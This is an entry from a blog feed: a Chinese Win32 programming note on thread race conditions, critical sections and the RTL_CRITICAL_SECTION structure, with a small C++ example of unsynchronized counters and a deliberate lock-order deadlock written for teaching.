    <content type="html"><![CDATA[<a id="more"></a><h3 id="多线程之间的资源抢占问题"><a href="#多线程之间的资源抢占问题" class="headerlink" title="多线程之间的资源抢占问题"></a>多线程之间的资源抢占问题</h3><p>​        当多个线程使用同一个资源时，会出现资源抢占问题</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><img src="Win32-3.assets/image-20201103194832013.png" style="zoom:80%;" /><p>​        这个程序功能为向文本框中加数字，每一次加一，两个线程同时加，每一个线程最多加到1000，当两个线程结束后，文本框中的期望值为2000。但是当同时按下两个按钮等待线程结束后，文本框中的结果却与期望值有偏差</p><img src="Win32-3.assets/image-20201103195026242.png" style="zoom:80%;" /><ul><li><p>线程函数1 代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>线程函数2 代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个线程函数步骤如下</p><ol><li>文本框中取值</li><li>字符串 -&gt; 数字</li><li>数字自加1</li><li>数字 -&gt; 字符串</li><li>放回文本框中</li></ol></li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>  ​        在windows系统中，一个线程使用一个CUP,但是电脑中的CPU有限，而电脑中又有很多进程，每一个进程中又存在很多线程，所以开发人员在设计的时候规定每一个线程使用CPU的时间为20ms，当一个线程20ms的时间用尽，只有等待下次为他分配时间时才可以继续工作。所以当两个线程同时操作一个全局变量时就会出现问题。</p><p>  <img src="Win32-3.assets/image-20201105194833216.png" style="zoom: 67%;" /><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105195059526.png"></p><h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><p>​        Windows设计出了临界区来解决线程抢占资源的问题</p><p>​        当多个设计程序多个线程都涉及到某个全局变量时，可以使用临界区来解决这个问题，临界区可以理解为给这个全局变量假定了一个令牌，这个令牌在程序中只有个块，只有拿到令牌的人才可以对全局变量进行操作。</p><img src="Win32-3.assets/image-20201105203720477.png" style="zoom:67%;" /><p>​        将上面的线程函数做如下下修改，就可以解决多线程使用同一个全局变量的问题。</p><img src="Win32-3.assets/image-20201105204003677.png" style="zoom:80%;" /><h4 id="临界区结构体部分成员解释"><a href="#临界区结构体部分成员解释" class="headerlink" title="临界区结构体部分成员解释"></a>临界区结构体部分成员解释</h4><p>结构体定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//  The following three fields control entering and exiting the critical</span></span><br><span class="line">    <span class="comment">//  section for the resource</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    LONG LockCount;</span><br><span class="line">    LONG RecursionCount;</span><br><span class="line">    HANDLE OwningThread;        <span class="comment">// from the thread&#x27;s ClientId-&gt;UniqueThread</span></span><br><span class="line">    HANDLE LockSemaphore;</span><br><span class="line">    ULONG_PTR SpinCount;        <span class="comment">// force size on 64-bit systems when packed</span></span><br><span class="line">&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;</span><br></pre></td></tr></table></figure><img src="Win32-3.assets/image-20201105204447624.png" style="zoom:80%;" /><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>​        临界区使用不当可能会造成死锁，当定义两个锁及以上使用需要格外小心，否则程序就可能造成死锁。下图就是死锁的基本原理，当使用临界区时，应该尽量注意将使用锁的使用顺序，经量将锁的使用顺序变成一样的。</p><p><img src="Win32-3.assets/image-20201105210326244.png"></p><h4 id="试写死锁程序"><a href="#试写死锁程序" class="headerlink" title="试写死锁程序"></a>试写死锁程序</h4><p>​         死锁程序没有任何作用，但是可以加深对临界区的理解，且所谓的死锁程序只是逻辑上的，当写出来后也不一定会立刻生效。</p><ul><li><p>线程1代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;cs1);<span class="comment">//锁1</span></span><br><span class="line">***********容易产生死锁的位置***********</span><br><span class="line">EnterCriticalSection(&amp;cs2);<span class="comment">//锁2</span></span><br><span class="line"></span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">LeaveCriticalSection(&amp;cs2);</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>线程2代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;cs2);<span class="comment">//锁2</span></span><br><span class="line">***********容易产生死锁的位置***********</span><br><span class="line">EnterCriticalSection(&amp;cs1);<span class="comment">//锁1</span></span><br><span class="line"></span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs1);</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;多线程之间的资源抢占问题&quot;&gt;&lt;a href=&quot;#多线程之间的资源抢占问题&quot; class=&quot;headerlink&quot; title=&quot;多线程之间的资源抢占问题&quot;&gt;&lt;/a&gt;多线程之间的资源抢占问题&lt;/h3&gt;&lt;p&gt;​        当多</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="线程" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
</feed>
